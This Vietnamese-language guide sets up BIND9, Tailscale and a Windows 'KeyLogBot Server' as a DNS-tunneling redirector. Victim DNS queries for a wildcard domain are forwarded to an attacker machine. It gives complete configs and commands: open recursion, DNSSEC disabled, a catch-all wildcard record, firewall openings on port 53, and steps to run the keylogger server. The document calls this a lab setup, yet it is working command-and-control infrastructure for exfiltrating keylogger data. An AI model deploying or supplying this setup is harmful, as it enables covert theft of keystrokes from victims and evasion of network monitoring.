# Hướng dẫn Cài đặt và Cấu hình BIND9 cho DNS Tunneling

Tài liệu này hướng dẫn chi tiết từng bước để thiết lập một máy chủ DNS Authoritative sử dụng **BIND9** trên hệ điều hành Linux (Ubuntu/Debian). Máy chủ này sẽ đóng vai trò nhận các truy vấn DNS từ Client (nạn nhân) và chuyển tiếp hoặc xử lý chúng trong mô hình DNS Tunneling.

## 1. Chuẩn bị

*   **Một máy chủ Linux (VPS):** Ubuntu 20.04/22.04 hoặc Debian.
*   **Địa chỉ IP (Tailscale):** Ví dụ `100.123.123.123`. (Do không có Public IP, ta dùng IP VPN).
*   **Tên miền (Domain):** Ví dụ `example.com`. Bạn cần quyền quản trị tên miền này tại nhà cung cấp (Namecheap, GoDaddy, v.v.).

## 2. Cấu hình Môi trường Fake Domain (Không cần Registrar)

Vì đây là môi trường Lab sử dụng tên miền giả lập (Fake Domain) và không có Public IP, BIND9 sẽ đóng vai trò là máy chủ quản lý tên miền (tương tự như một Registrar/Root Server thu nhỏ).

Bạn **không cần** mua tên miền hay cấu hình Glue Records trên Internet. Thay vào đó, để Client (Nạn nhân) phân giải được tên miền `example.com`, bạn cần:

1.  **Cấu hình DNS Client:** Trên máy nạn nhân, đặt địa chỉ **DNS Server** trỏ về địa chỉ IP của máy chủ Ubuntu (máy chạy BIND9).
2.  **Kết nối mạng:** Đảm bảo máy nạn nhân có thể ping thấy máy Ubuntu.

Khi đó, mọi truy vấn tới `*.example.com` từ nạn nhân sẽ được gửi tới BIND9, và BIND9 sẽ xử lý tiếp (forward về máy Attacker qua VPN).

## 3. Cài đặt BIND9

Đăng nhập vào VPS qua SSH và thực hiện các lệnh sau:

```bash
# Cập nhật danh sách gói
sudo apt update

# Cài đặt BIND9 và các công cụ DNS utils
sudo apt install bind9 bind9utils bind9-doc dnsutils -y
```

## 4. Cấu hình BIND9

Các file cấu hình chính nằm trong thư mục `/etc/bind/`.

### Bước 4.1: Cấu hình Options (`named.conf.options`)

Mở file cấu hình options:

```bash
sudo nano /etc/bind/named.conf.options
```

Chỉnh sửa nội dung như sau. Cấu hình này biến BIND9 thành một **Forwarder**, chuyển tiếp các truy vấn DNS đến KeyLogBot Server (đang chạy trên IP Tailscale `100.123.123.123`).

```bind
options {
        directory "/var/cache/bind";

        // If there is a firewall between you and nameservers you want
        // to talk to, you may need to fix the firewall to allow multiple
        // ports to talk.  See http://www.kb.cert.org/vuls/id/800113

        // If your ISP provided one or more IP addresses for stable
        // nameservers, you probably want to use them as forwarders.
        // Uncomment the following block, and insert the addresses replacing
        // the all-0's placeholder.
        
        # Cho phép đệ quy để server có thể forward query đi
        recursion yes;
        allow-recursion { any; };

        # Địa chỉ IP của KeyLogBot Server (trong mạng Tailscale)
        forwarders {
                100.123.123.123;
        };

        # Chỉ forward, không tự phân giải
        forward only;

        # Tắt DNSSEC để tránh lỗi xác thực với server tự chế
        dnssec-validation no;
        
        listen-on { any; };
        listen-on-v6 { any; };
};
```

**Lưu ý:** Thay `100.123.123.123` bằng IP Tailscale thực tế của máy chạy KeyLogBot Server.

### Bước 4.2: Khai báo Zone (`named.conf.local`)

Đây là nơi bạn định nghĩa các zone (vùng) DNS. Chúng ta sẽ cấu hình zone `example.com` là loại `forward` để chuyển tiếp query đến máy Attacker, và thêm các zone phân giải ngược (Reverse DNS) nếu cần.

Mở file:
```bash
sudo nano /etc/bind/named.conf.local
```

Thay thế nội dung file bằng cấu hình sau:

```bind
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/var/lib/bind/zones.rfc1918";

//zone "example.com" {
//      type master;
//      file "/var/lib/bind/forward.example.com.db";
//};

// Zone phân giải ngược cho dải IP 100.123.123.x (Tailscale)
zone "123.123.100.in-addr.arpa" {
    type master;
    file "/var/lib/bind/db.100.123.123";
};

// Zone phân giải ngược khác (nếu có)
zone "111.111.100.in-addr.arpa" {
    type master;
    file "/var/lib/bind/db.100.111.111";
};

// Zone chính: Forward toàn bộ query example.com về máy Attacker
zone "example.com" {
    type forward;
    forwarders { 100.123.123.123; };
};
```

### Bước 4.3: Tạo File Zone

Tạo thư mục chứa zone nếu chưa có:
```bash
sudo mkdir /etc/bind/zones
```

Copy file mẫu để tạo file zone mới:
```bash
sudo cp /etc/bind/db.local /etc/bind/zones/db.example.com
```

Chỉnh sửa file zone:
```bash
sudo nano /etc/bind/zones/db.example.com
```

Nội dung file zone (thay `example.com` và IP bằng thông tin của bạn):

```bind
;
; BIND data file for example.com
;
$TTL    604800
@       IN      SOA     ns1.example.com. admin.example.com. (
                              2         ; Serial (Tăng số này mỗi khi sửa file)
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
; Name Servers
@       IN      NS      ns1.example.com.

; A Records cho Name Server
ns1     IN      A       100.123.123.123

; A Record cho domain chính (nếu muốn ping example.com ra IP)
@       IN      A       100.123.123.123

; Wildcard Record (Quan trọng cho DNS Tunneling)
; Bắt tất cả các subdomain *.example.com
*       IN      A       100.123.123.123
```

**Lưu ý:** Dòng `* IN A ...` rất quan trọng. Nó đảm bảo mọi truy vấn dạng `data.example.com`, `abc.example.com` đều được gửi về server này để xử lý.

## 5. Kiểm tra và Khởi động lại

### Kiểm tra cú pháp cấu hình
```bash
sudo named-checkconf
```
(Nếu không có output gì hiện ra là đúng).

### Kiểm tra file zone
```bash
sudo named-checkzone example.com /etc/bind/zones/db.example.com
```
Output nên là: `OK`.

### Khởi động lại dịch vụ BIND9
```bash
sudo systemctl restart bind9
```

### Cho phép qua tường lửa (UFW)
Nếu dùng UFW, hãy mở port 53 (cả TCP và UDP):
```bash
sudo ufw allow Bind9
```

## 6. Kiểm tra hoạt động

Từ máy tính cá nhân (hoặc một máy khác), sử dụng `nslookup` hoặc `dig` để kiểm tra xem server có phân giải được không.

**Kiểm tra NS record:**
```bash
nslookup -type=ns example.com 100.123.123.123
```

**Kiểm tra Wildcard (giả lập DNS Tunneling query):**
```bash
nslookup anything.example.com 100.123.123.123
```
Nếu kết quả trả về IP `100.123.123.123` là thành công.

## 7. Mô hình Kết nối (Redirector)

Trong cấu hình này, chúng ta sử dụng mô hình **Redirector**:
1.  **VPS Public (BIND9):** Nhận query từ Internet (Nạn nhân).
2.  **Tailscale VPN:** Tạo đường hầm bảo mật giữa VPS và máy Attacker.
3.  **Attacker Machine (KeyLogBot Server):** Chạy ứng dụng C# xử lý DNS, lắng nghe trên IP Tailscale (`100.123.123.123`).

BIND9 sẽ forward toàn bộ query nhận được về IP `100.123.123.123` qua giao diện Tailscale.

## 8. Hướng dẫn Cài đặt Tailscale (VPN)

Tailscale giúp tạo mạng riêng ảo (VPN) để kết nối giữa VPS (Ubuntu) và máy Attacker (Windows).

### Bước 8.1: Cài đặt trên VPS (Ubuntu)

1.  Chạy lệnh cài đặt:
    ```bash
    curl -fsSL https://tailscale.com/install.sh | sh
    ```
2.  Kích hoạt và đăng nhập:
    ```bash
    sudo tailscale up
    ```
    Copy link xác thực vào trình duyệt.

### Bước 8.2: Cài đặt trên máy Attacker (Windows)

1.  Tải bộ cài Tailscale cho Windows từ: [https://tailscale.com/download/windows](https://tailscale.com/download/windows)
2.  Cài đặt và đăng nhập cùng tài khoản với VPS.
3.  **Lấy IP Tailscale:**
    *   Mở PowerShell hoặc CMD.
    *   Gõ `tailscale ip -4`.
    *   Giả sử IP là `100.123.123.123`. Đây là IP bạn điền vào file cấu hình BIND9 trên VPS.

## 9. Hướng dẫn Cài đặt và Chạy KeyLogBot Server (.NET) trên Windows

Phần này thực hiện trên máy **Attacker (Windows)**.

### Bước 9.1: Cài đặt .NET 8 SDK

1.  Tải .NET 8 SDK cho Windows tại: [https://dotnet.microsoft.com/download/dotnet/8.0](https://dotnet.microsoft.com/download/dotnet/8.0)
2.  Cài đặt file `.exe`.
3.  Kiểm tra trong CMD: `dotnet --version`.

### Bước 9.2: Cấu hình Firewall Windows

Vì Server lắng nghe cổng 53 (UDP), bạn cần mở cổng này trên Windows Firewall.

Mở PowerShell với quyền **Administrator** và chạy:

```powershell
New-NetFirewallRule -DisplayName "Allow DNS UDP Inbound" -Direction Inbound -Action Allow -Protocol UDP -LocalPort 53
New-NetFirewallRule -DisplayName "Allow DNS TCP Inbound" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 53
```

### Bước 9.3: Chạy Server

1.  Mở CMD hoặc PowerShell với quyền **Administrator** (Bắt buộc để bind port 53).
2.  Di chuyển đến thư mục chứa code Server:
    ```cmd
    cd path\to\KeyLogBot\Server
    ```
3.  Chạy ứng dụng:
    ```cmd
    dotnet run
    ```
    *(Hoặc nếu đã build ra file .exe thì chạy trực tiếp file .exe)*.

### Bước 9.4: Kiểm tra kết nối từ VPS

Quay lại SSH trên **VPS Ubuntu**, thử gửi query đến máy Windows qua đường hầm Tailscale:

```bash
dig @100.123.123.123 test.example.com
```

*   Nếu trên màn hình Console của máy Windows hiện log nhận được query -> **Thành công**.
*   Nếu timeout -> Kiểm tra lại Windows Firewall hoặc xem Tailscale trên Windows có đang "Connected" không.
